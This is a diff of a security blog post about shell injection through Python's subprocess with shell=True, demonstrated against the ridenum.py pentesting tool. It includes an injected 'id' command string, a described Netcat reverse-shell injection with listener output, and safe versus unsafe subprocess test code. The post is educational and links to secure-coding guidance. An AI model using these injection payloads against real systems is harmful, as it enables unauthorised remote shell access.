@@ -3,16 +3,16 @@
 # Python's Risky Subprocess Module & Pwning A Pentesting Tool
 _____________________________________________________________________
 
-For some reason looking at other people's source code makes me feel all warm and fuzzy inside. Kinda of like the description a Millenial hipster gives you. You know, when they tell you how they sat down and read a 'good book' with a cup of gluten-free, 100% non-GMO, Rainforest Alliance Certified Coffee. 
+I'd never thought I would have enjoyed reading other individuals source code as much as I do now. There's just something so gratifying about it. Dissecting someone's application, script or program looking for a flaw to leverage or a lapse in logic that can be manipulated is exhilarating. 
 
-Reading source code from other individuals can give you an insight into a lot of things like:
+Reading source code from other individuals can give you an insight into a lot of things like some of the below items:
   * New syntax and syntactical methods that you never knew existed in a language
-  * How to get code to execute by bypassing AV, countermeasures, etc.
-  * What not to do when developing an application of any sort
-  * What the alcohol choice was during development ;)
+  * How to get code to execute by bypassing AV, countermeasures, etc. (if looking at a piece of malware)
+  * What not to do when developing an application, script or program of any sort
+  * If alcohol was present during development ;)
   
-## Some Of Python's Dangerous Functions & Methods
-Python is a fantastic language. It's one of my favorites along side PowerShell, and C#. However, like all computer languages it doesn't come without it's flaws or dangerous functions and methods. You can read more about some of those dangerous functions and methods in the below links:
+## Python's Risky Subprocess Module
+Python is a fantastic language. It's one of my favorites along side PowerShell, C# and some others. However, like all computer languages it doesn't come without it's flaws or dangerous functions and methods. You can read more about some of those dangerous functions and methods in the below links:
  1. [Dangerous Python Functions Part 1](https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html)
  2. [Dangerous Python Functions Part 2](https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html)
  3. [OpenStack: Use Subprocess Securely](https://security.openstack.org/guidelines/dg_use-subprocess-securely.html)
@@ -33,7 +33,7 @@ There are at least two arguments that helped me obtain code execution, which was
 
 ### Two things can be taken in to consideration at this point (links 3, 4 and 5 above do a great job explaining the problems):
 
-1. The `shell` parameter in both calls are set to `true`. That's a no no, especially if you allow a user to supply input to your script or program. In simple terms, this tells Python to execute the string containing the command(s) as if you were doing it in a bash shell.
+1. The `shell` parameter in both calls are set to `true`. That's a no no, especially if you allow a user to supply input to your script. In simple terms, this tells Python to execute the string containing the command(s) as if you were doing it in a bash shell.
 
 2. The `command` variable is a **string** variable that contains the entirety of a bash command.
 
@@ -43,7 +43,7 @@ Example: ./ridenum.py 192.168.1.50 500 50000 /root/dict.txt /root/user.txt
 
 Usage: ./ridenum.py <server_ip> <start_rid> <end_rid> <optional_username> <optional_password> <optional_password_file> <optional_username_filename>
 ```
-As I said before, doing this via command line arguments is a little trickier. One would expect that all they would have to do is excute the following command `./ridenum.py 10.10.10.10;id; 100 1000 0v3rride`. This doesn't work, because all you're doing is terminating the `ridenum.py` script prematurely without giving it all of the required arguments, calling the bash command `id` and then specifying abunch of junk after the fact that has no meaning in bash (`100 1000 0v3rride`). Take a look at point two again above and notice the keyword 'string'.
+As I said before, doing this via command line arguments is a little trickier. One would expect that all they would have to do is excute the following command `./ridenum.py 10.10.10.10;id; 100 1000 0v3rride`. This is incorrect, because all you're doing is terminating the `ridenum.py` script prematurely without giving it all of the required arguments, calling the bash command `id` and then specifying abunch of junk after the fact that has no meaning in bash (`100 1000 0v3rride`). Take a look at point two again above and notice the keyword 'string'.
 
 Let's execute ridenum and inject a Netcat command to give us a reverse shell.
 ```
@@ -54,11 +54,8 @@ Result:
 ```
 listening on [any] 1234 ...
 connect to [192.168.1.126] from (UNKNOWN) [192.168.1.111] 53370
-ls
-CHANGELOG.txt
-LICENSE.txt
-README.md
-ridenum.py
+whoami
+tester
 ```
 
 Note the double quotes surrounding the `ip` argument. The string that represents the `ip` argument is evaluated by the `Popen` object. It's similar to how the `Invoke-Expression` cmdlet works in PowerShell. It evaluates a string that's valid syntax and executes it. Also note how I placed the `nc` command within the `ip` argument. Why do I need two `;`? If I don't add another `;` to terminate, `ridenum.py` tries creating a list of users enumerated during RID cycling, which kills the reverse shell immediately. So placing the second `;` after `-c bash` will keep the reverse shell alive until you exit it.
@@ -105,3 +102,11 @@ print(subprocess.check_output("echo {}".format(userinput), shell=False).decode("
 print("Test 4: shell=false, list of strings");
 print(subprocess.check_output(["echo", "{}".format(userinput)], shell=False).decode("UTF-8"));
 ```
+
+## Resources
+ 1. [Dangerous Python Functions Part 1](https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html)
+ 2. [Dangerous Python Functions Part 2](https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html)
+ 3. [OpenStack: Use Subprocess Securely](https://security.openstack.org/guidelines/dg_use-subprocess-securely.html)
+ 4. [OpenStack: Avoiding Shell Injection](https://security.openstack.org/guidelines/dg_avoid-shell-true.html)
+ 5. [A Medium Blog About Python Shell Injection](https://medium.com/python-pandemonium/a-trap-of-shell-true-in-the-subprocess-module-6db7fc66cdfd)
+ 6. [Official Python Documentation](https://docs.python.org/3.7/library/subprocess.html#popen-objects)
